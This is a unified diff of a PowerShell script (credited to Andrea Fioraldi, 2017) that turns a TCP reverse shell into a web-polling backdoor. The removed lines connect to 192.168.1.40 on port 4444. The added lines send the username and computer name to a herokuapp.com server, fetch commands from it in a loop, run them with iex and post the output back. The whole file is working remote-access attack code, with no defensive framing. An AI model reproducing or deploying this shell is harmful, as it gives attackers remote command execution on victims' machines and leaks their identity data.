@@ -1,44 +1,45 @@
 # Copyright (c) 2017 Andrea Fioraldi
 # License http://opensource.org/licenses/mit-license.php MIT License
 
-#change ip and port
-$ip_address = "192.168.1.40"
-$port = 4444
+$__url = "https://unorubberserver.herokuapp.com/"
 
-$client = New-Object System.Net.Sockets.TCPClient($ip_address, $port);
-$stream = $client.GetStream();
-[byte[]] $in_bytes = 0..65535|%{0};
+$__params = @{output = "Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`nPS " + (pwd).Path + "> "}
+Invoke-WebRequest -UseBasicParsing -Uri ($__url + "update_output/") -Method POST -Body $__params
 
-$out_bytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
-$stream.Write($out_bytes, 0, $out_bytes.Length)
-
-$out_bytes = ([text.encoding]::ASCII).GetBytes("PS " + (pwd).Path + "> ")
-$stream.Write($out_bytes, 0, $out_bytes.Length)
-$stream.Flush() 
-
-while (($i = $stream.Read($in_bytes, 0, $in_bytes.Length)) -ne 0)
+while (1 -eq 1)
 {
-	$cmd = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($in_bytes, 0, $i);
-	$result = ""
+	$__cmd = ""
 	
 	try
 	{
-		$result = (iex $cmd 2>&1 | Out-String)
+		$__cmd = (Invoke-WebRequest -UseBasicParsing -Uri ($__url + "get_cmd")).Content
+	}
+	catch
+	{
+		Sleep 1
+		continue
+	}
+	
+	if ($__cmd -eq "")
+	{
+		Sleep 3
+		continue
+	}
+	
+	$__result = ""
+	
+	try
+	{
+		$__result = (iex $__cmd 2>&1 | Out-String)
 	}
 	catch
 	{
 		Write-Error $_
 	}
 
-	$out_bytes = ([text.encoding]::ASCII).GetBytes($result + ($error[0] | Out-String))
+	$__output = $__result + ($error[0] | Out-String)
 	$error.clear()
 	
-	$stream.Write($out_bytes, 0, $out_bytes.Length)
-	$stream.Flush()
-	
-	$out_bytes = ([text.encoding]::ASCII).GetBytes("PS " + (pwd).Path + "> ")
-	$stream.Write($out_bytes, 0, $out_bytes.Length)
-	$stream.Flush() 
+	$__params = @{output = $__output + "`nPS " + (pwd).Path + "> "}
+	Invoke-WebRequest -UseBasicParsing -Uri ($__url + "update_output/") -Method POST -Body $__params
 }
-
-$client.Close()
